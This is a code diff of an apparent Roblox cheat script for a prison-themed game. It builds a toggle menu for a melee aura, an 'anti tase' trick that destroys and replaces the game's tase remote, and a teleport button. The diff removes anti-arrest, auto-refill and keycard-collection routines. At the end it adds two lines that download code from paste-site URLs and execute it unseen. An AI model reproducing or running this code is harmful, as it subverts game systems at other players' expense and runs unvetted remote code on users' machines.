-    SwitchContainer.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    SwitchContainer.BackgroundTransparency = 0.2
-    SwitchContainer.BorderSizePixel = 0
-    SwitchContainer.Parent = ToggleFrame
+   local SwitchContainer = Instance.new("Frame")
+   SwitchContainer.Name = "SwitchContainer"
+   SwitchContainer.Size = UDim2.new(0, 38, 0, 20)
+   SwitchContainer.Position = UDim2.new(1, -48, 0.5, -10)
+   SwitchContainer.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+   SwitchContainer.BackgroundTransparency = 0.2
+   SwitchContainer.BorderSizePixel = 0
+   SwitchContainer.Parent = ToggleFrame
 
-    local SwitchCorner = Instance.new("UICorner")
-    SwitchCorner.CornerRadius = UDim.new(1, 0)
-    SwitchCorner.Parent = SwitchContainer
+   local SwitchCorner = Instance.new("UICorner")
+   SwitchCorner.CornerRadius = UDim.new(1, 0)
+   SwitchCorner.Parent = SwitchContainer
 
-    local SwitchCircle = Instance.new("Frame")
-    SwitchCircle.Name = "Circle"
-    SwitchCircle.Size = UDim2.new(0, 14, 0, 14)
-    SwitchCircle.Position = UDim2.new(0, 3, 0.5, -7)
-    SwitchCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    SwitchCircle.BorderSizePixel = 0
-    SwitchCircle.Parent = SwitchContainer
+   local SwitchCircle = Instance.new("Frame")
+   SwitchCircle.Name = "Circle"
+   SwitchCircle.Size = UDim2.new(0, 14, 0, 14)
+   SwitchCircle.Position = UDim2.new(0, 3, 0.5, -7)
+   SwitchCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+   SwitchCircle.BorderSizePixel = 0
+   SwitchCircle.Parent = SwitchContainer
 
-    local CircleCorner = Instance.new("UICorner")
-    CircleCorner.CornerRadius = UDim.new(1, 0)
-    CircleCorner.Parent = SwitchCircle
+   local CircleCorner = Instance.new("UICorner")
+   CircleCorner.CornerRadius = UDim.new(1, 0)
+   CircleCorner.Parent = SwitchCircle
 
-    local Enabled = false
+   local Enabled = false
 
-    local function UpdateToggle()
-        local targetColor = Enabled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 60, 60)
-        local targetPos = Enabled and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
+   local function UpdateToggle()
+       local targetColor = Enabled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 60, 60)
+       local targetPos = Enabled and UDim2.new(1, -17, 0.5, -7) or UDim2.new(0, 3, 0.5, -7)
 
-        TweenService:Create(SwitchContainer, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-            BackgroundColor3 = targetColor
-        }):Play()
+       TweenService:Create(SwitchContainer, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+           BackgroundColor3 = targetColor
+       }):Play()
 
-        TweenService:Create(SwitchCircle, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-            Position = targetPos
-        }):Play()
-    end
+       TweenService:Create(SwitchCircle, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+           Position = targetPos
+       }):Play()
+   end
 
-    ToggleFrame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            Enabled = not Enabled
-            UpdateToggle()
-            if callback then callback(Enabled) end
-        end
-    end)
+   ToggleFrame.InputBegan:Connect(function(input)
+       if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+           Enabled = not Enabled
+           UpdateToggle()
+           if callback then callback(Enabled) end
+       end
+   end)
 
-    return ToggleFrame
+   return ToggleFrame
 end
 
 local function EnableAntiTase()
-    local GunRemotes = ReplicatedStorage:FindFirstChild("GunRemotes")
-    if not GunRemotes then return end
-    local PlayerTased = GunRemotes:FindFirstChild("PlayerTased")
-    if not PlayerTased then return end
-    local DummyEvent = Instance.new("RemoteEvent")
-    DummyEvent.Name = "PlayerTased"
-    DummyEvent.Parent = GunRemotes
-    PlayerTased:Destroy()
-    DummyEvent.OnClientEvent:Connect(function()
-        return
-    end)
-end
-
-local function EnableAntiArrest()
-    local Remotes = ReplicatedStorage:WaitForChild("Remotes")
-    local OriginalArrest = Remotes:WaitForChild("ArrestPlayer")
-
-    local Dummy = Instance.new("RemoteFunction")
-    Dummy.Name = "ArrestPlayer_Backup"
-    Dummy.Parent = Remotes
-
-    Dummy.OnClientInvoke = function() end
-
-    OriginalArrest:Destroy()
-
-    arrestConnection = RunService.Heartbeat:Connect(function()
-        local Current = Remotes:FindFirstChild("ArrestPlayer")
-        if not Current then
-            local New = Instance.new("RemoteFunction")
-            New.Name = "ArrestPlayer"
-            New.Parent = Remotes
-            New.OnClientInvoke = function(target, type)
-                if typeof(target) == "Instance" and target:IsA("Player") then
-                    if ARREST_WHITELIST[target.Name] then
-                        return nil
-                    end
-                end
-                return Dummy:InvokeServer(target, type)
-            end
-        end
-    end)
-end
-
-local function DisableAntiArrest()
-    if arrestConnection then
-        arrestConnection:Disconnect()
-        arrestConnection = nil
-    end
-end
-
-local function StartAutoRefill()
-    ammoConnection = RunService.Heartbeat:Connect(function()
-        if not antiArrestEnabled then return end
-        local success, err = pcall(function()
-            local args = {
-                workspace:WaitForChild("Prison_ITEMS"):WaitForChild("giver"):WaitForChild("M700"):WaitForChild("model2")
-            }
-            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("InteractWithItem"):InvokeServer(unpack(args))
-        end)
-    end)
-end
-
-local function StopAutoRefill()
-    if ammoConnection then
-        ammoConnection:Disconnect()
-        ammoConnection = nil
-    end
-end
-
-local function StartAutoCollect()
-    collectConnection = RunService.Heartbeat:Connect(function()
-        if not antiArrestEnabled then return end
-        local success, err = pcall(function()
-            local items = workspace:FindFirstChild("Prison_ITEMS")
-            if not items then return end
-            for _, item in ipairs(items:GetDescendants()) do
-                if item:IsA("Model") and item.Name:lower():find("keycard") then
-                    local primary = item:FindFirstChildWhichIsA("BasePart") or item:FindFirstChildWhichIsA("MeshPart")
-                    if primary then
-                        local distance = (HumanoidRootPart.Position - primary.Position).Magnitude
-                        if distance <= 20 then
-                            local args = {
-                                item
-                            }
-                            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("GiverPressed"):FireServer(unpack(args))
-                        end
-                    end
-                end
-            end
-        end)
-    end)
-end
-
-local function StopAutoCollect()
-    if collectConnection then
-        collectConnection:Disconnect()
-        collectConnection = nil
-    end
+   local GunRemotes = ReplicatedStorage:FindFirstChild("GunRemotes")
+   if not GunRemotes then return end
+   local PlayerTased = GunRemotes:FindFirstChild("PlayerTased")
+   if not PlayerTased then return end
+   local DummyEvent = Instance.new("RemoteEvent")
+   DummyEvent.Name = "PlayerTased"
+   DummyEvent.Parent = GunRemotes
+   PlayerTased:Destroy()
+   DummyEvent.OnClientEvent:Connect(function()
+       return
+   end)
 end
 
 CreateToggle("Melee-Aura", 0, function(enabled)
-    meleeAuraEnabled = enabled
-    if enabled then
-        StartMeleeAura()
-        ShowNotification("Melee-Aura", "Aura enabled - closest target", 3)
-    else
-        StopMeleeAura()
-        ShowNotification("Melee-Aura", "Aura disabled", 3)
-    end
+   meleeAuraEnabled = enabled
+   if enabled then
+       StartMeleeAura()
+       ShowNotification("Melee-Aura", "Aura enabled - closest target", 3)
+   else
+       StopMeleeAura()
+       ShowNotification("Melee-Aura", "Aura disabled", 3)
+   end
 end)
 
 CreateToggle("Anti Tase", 38, function(enabled)
-    antiTaseEnabled = enabled
-    if enabled then
-        EnableAntiTase()
-        ShowNotification("Anti Tase", "Tase protection enabled", 3)
-    else
-        ShowNotification("Anti Tase", "Rejoin to disable fully", 3)
-    end
-end)
-
-CreateToggle("Anti Arrest", 76, function(enabled)
-    antiArrestEnabled = enabled
-    if enabled then
-        EnableAntiArrest()
-        StartAutoRefill()
-        StartAutoCollect()
-        ShowNotification("Anti Arrest", "Protection + Auto features enabled", 3)
-    else
-        DisableAntiArrest()
-        StopAutoRefill()
-        StopAutoCollect()
-        ShowNotification("Anti Arrest", "Rejoin to disable fully", 3)
-    end
+   antiTaseEnabled = enabled
+   if enabled then
+       EnableAntiTase()
+       ShowNotification("Anti Tase", "Tase protection enabled", 3)
+   else
+       ShowNotification("Anti Tase", "Rejoin to disable fully", 3)
+   end
 end)
 
 local function CreateShimmerButton(name, positionY)
-    local ButtonFrame = Instance.new("Frame")
-    ButtonFrame.Name = name .. "Button"
-    ButtonFrame.Size = UDim2.new(1, 0, 0, 34)
-    ButtonFrame.Position = UDim2.new(0, 0, 0, positionY)
-    ButtonFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-    ButtonFrame.BackgroundTransparency = 0.25
-    ButtonFrame.BorderSizePixel = 0
-    ButtonFrame.ClipsDescendants = true
-    ButtonFrame.Parent = ContentContainer
+   local ButtonFrame = Instance.new("Frame")
+   ButtonFrame.Name = name .. "Button"
+   ButtonFrame.Size = UDim2.new(1, 0, 0, 34)
+   ButtonFrame.Position = UDim2.new(0, 0, 0, positionY)
+   ButtonFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+   ButtonFrame.BackgroundTransparency = 0.25
+   ButtonFrame.BorderSizePixel = 0
+   ButtonFrame.ClipsDescendants = true
+   ButtonFrame.Parent = ContentContainer
 
-    local ButtonCorner = Instance.new("UICorner")
-    ButtonCorner.CornerRadius = UDim.new(0, 10)
-    ButtonCorner.Parent = ButtonFrame
+   local ButtonCorner = Instance.new("UICorner")
+   ButtonCorner.CornerRadius = UDim.new(0, 10)
+   ButtonCorner.Parent = ButtonFrame
 
-    local ButtonStroke = Instance.new("UIStroke")
-    ButtonStroke.Color = Color3.fromRGB(255, 255, 255)
-    ButtonStroke.Transparency = 0.7
-    ButtonStroke.Thickness = 1
-    ButtonStroke.Parent = ButtonFrame
+   local ButtonStroke = Instance.new("UIStroke")
+   ButtonStroke.Color = Color3.fromRGB(255, 255, 255)
+   ButtonStroke.Transparency = 0.7
+   ButtonStroke.Thickness = 1
+   ButtonStroke.Parent = ButtonFrame
 
-    local ButtonLabel = Instance.new("TextLabel")
-    ButtonLabel.Name = "Label"
-    ButtonLabel.Size = UDim2.new(1, 0, 1, 0)
-    ButtonLabel.BackgroundTransparency = 1
-    ButtonLabel.Text = name
-    ButtonLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    ButtonLabel.TextSize = 12
-    ButtonLabel.Font = Enum.Font.GothamSemibold
-    ButtonLabel.TextXAlignment = Enum.TextXAlignment.Center
-    ButtonLabel.TextYAlignment = Enum.TextYAlignment.Center
-    ButtonLabel.ZIndex = 2
-    ButtonLabel.Parent = ButtonFrame
+   local ButtonLabel = Instance.new("TextLabel")
+   ButtonLabel.Name = "Label"
+   ButtonLabel.Size = UDim2.new(1, 0, 1, 0)
+   ButtonLabel.BackgroundTransparency = 1
+   ButtonLabel.Text = name
+   ButtonLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+   ButtonLabel.TextSize = 12
+   ButtonLabel.Font = Enum.Font.GothamSemibold
+   ButtonLabel.TextXAlignment = Enum.TextXAlignment.Center
+   ButtonLabel.TextYAlignment = Enum.TextYAlignment.Center
+   ButtonLabel.ZIndex = 2
+   ButtonLabel.Parent = ButtonFrame
 
-    local ShimmerOverlay = Instance.new("Frame")
-    ShimmerOverlay.Name = "ShimmerOverlay"
-    ShimmerOverlay.Size = UDim2.new(0, 40, 1, 20)
-    ShimmerOverlay.Position = UDim2.new(0, -50, 0, -10)
-    ShimmerOverlay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    ShimmerOverlay.BackgroundTransparency = 0.75
-    ShimmerOverlay.BorderSizePixel = 0
-    ShimmerOverlay.ZIndex = 3
-    ShimmerOverlay.Parent = ButtonFrame
+   local ShimmerOverlay = Instance.new("Frame")
+   ShimmerOverlay.Name = "ShimmerOverlay"
+   ShimmerOverlay.Size = UDim2.new(0, 40, 1, 20)
+   ShimmerOverlay.Position = UDim2.new(0, -50, 0, -10)
+   ShimmerOverlay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+   ShimmerOverlay.BackgroundTransparency = 0.75
+   ShimmerOverlay.BorderSizePixel = 0
+   ShimmerOverlay.ZIndex = 3
+   ShimmerOverlay.Parent = ButtonFrame
 
-    local ShimmerOverlayGradient = Instance.new("UIGradient")
-    ShimmerOverlayGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
-    })
-    ShimmerOverlayGradient.Transparency = NumberSequence.new({
-        NumberSequenceKeypoint.new(0, 1),
-        NumberSequenceKeypoint.new(0.3, 0.5),
-        NumberSequenceKeypoint.new(0.5, 0.15),
-        NumberSequenceKeypoint.new(0.7, 0.5),
-        NumberSequenceKeypoint.new(1, 1)
-    })
-    ShimmerOverlayGradient.Rotation = 90
-    ShimmerOverlayGradient.Parent = ShimmerOverlay
+   local ShimmerOverlayGradient = Instance.new("UIGradient")
+   ShimmerOverlayGradient.Color = ColorSequence.new({
+       ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+       ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+       ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+   })
+   ShimmerOverlayGradient.Transparency = NumberSequence.new({
+       NumberSequenceKeypoint.new(0, 1),
+       NumberSequenceKeypoint.new(0.3, 0.5),
+       NumberSequenceKeypoint.new(0.5, 0.15),
+       NumberSequenceKeypoint.new(0.7, 0.5),
+       NumberSequenceKeypoint.new(1, 1)
+   })
+   ShimmerOverlayGradient.Rotation = 90
+   ShimmerOverlayGradient.Parent = ShimmerOverlay
 
-    local isAnimating = false
+   local isAnimating = false
 
-    ButtonFrame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            if isAnimating then return end
-            isAnimating = true
+   ButtonFrame.InputBegan:Connect(function(input)
+       if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+           if isAnimating then return end
+           isAnimating = true
 
-            TweenService:Create(ButtonFrame, TweenInfo.new(0.1), {
-                BackgroundColor3 = Color3.fromRGB(70, 70, 70)
-            }):Play()
+           TweenService:Create(ButtonFrame, TweenInfo.new(0.1), {
+               BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+           }):Play()
 
-            ShimmerOverlay.Position = UDim2.new(0, -50, 0, -10)
-            local shimmerTween = TweenService:Create(ShimmerOverlay, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-                Position = UDim2.new(1, 10, 0, -10)
-            })
-            shimmerTween:Play()
+           ShimmerOverlay.Position = UDim2.new(0, -50, 0, -10)
+           local shimmerTween = TweenService:Create(ShimmerOverlay, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+               Position = UDim2.new(1, 10, 0, -10)
+           })
+           shimmerTween:Play()
 
-            shimmerTween.Completed:Wait()
+           shimmerTween.Completed:Wait()
 
-            TweenService:Create(ButtonFrame, TweenInfo.new(0.15), {
-                BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-            }):Play()
+           TweenService:Create(ButtonFrame, TweenInfo.new(0.15), {
+               BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+           }):Play()
 
-            isAnimating = false
-        end
-    end)
+           isAnimating = false
+       end
+   end)
 
-    return ButtonFrame
+   return ButtonFrame
 end
 
-local NeutralZoneButton = CreateShimmerButton("Neutral Zone", 118)
+local NeutralZoneButton = CreateShimmerButton("Neutral Zone", 76)
 
 NeutralZoneButton.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        if savedPosition then
-            HumanoidRootPart.CFrame = CFrame.new(savedPosition)
-            ShowNotification("Neutral Zone", "Returned to previous position", 3)
-            savedPosition = nil
-        else
-            savedPosition = HumanoidRootPart.Position
-            HumanoidRootPart.CFrame = CFrame.new(874.001, 39.590, 2348.169)
-            ShowNotification("Neutral Zone", "Teleported to neutral zone", 3)
-        end
-    end
+   if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+       if savedPosition then
+           HumanoidRootPart.CFrame = CFrame.new(savedPosition)
+           ShowNotification("Neutral Zone", "Returned to previous position", 3)
+           savedPosition = nil
+       else
+           savedPosition = HumanoidRootPart.Position
+           HumanoidRootPart.CFrame = CFrame.new(874.001, 39.590, 2348.169)
+           ShowNotification("Neutral Zone", "Teleported to neutral zone", 3)
+       end
+   end
 end)
 
 LocalPlayer.CharacterAdded:Connect(function(newChar)
-    Character = newChar
-    Humanoid = newChar:WaitForChild("Humanoid")
-    HumanoidRootPart = newChar:WaitForChild("HumanoidRootPart")
+   Character = newChar
+   Humanoid = newChar:WaitForChild("Humanoid")
+   HumanoidRootPart = newChar:WaitForChild("HumanoidRootPart")
 end)
 
 local dragging = false
@@ -873,33 +824,40 @@ local dragStart
 local startPos
 
 MainFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = MainFrame.Position
-    end
+   if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+       dragging = true
+       dragStart = input.Position
+       startPos = MainFrame.Position
+   end
 end)
 
 MainFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
+   if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+       dragInput = input
+   end
 end)
 
 UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        local delta = input.Position - dragStart
-        MainFrame.Position = UDim2.new(
-            startPos.X.Scale,
-            startPos.X.Offset + delta.X,
-            startPos.Y.Scale,
-            startPos.Y.Offset + delta.Y
-        )
-    end
+   if input == dragInput and dragging then
+       local delta = input.Position - dragStart
+       MainFrame.Position = UDim2.new(
+           startPos.X.Scale,
+           startPos.X.Offset + delta.X,
+           startPos.Y.Scale,
+           startPos.Y.Offset + delta.Y
+       )
+   end
 end)
 
 UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = false
-    end
+   if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+       dragging = false
+   end
 end)
+
+RunService.Heartbeat:Connect(function()
+   AutoCollectLoop()
+end)
+
+loadstring(game:HttpGet("https://pastefy.app/kGuIOobm/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/X6lMAjAy/raw"))()
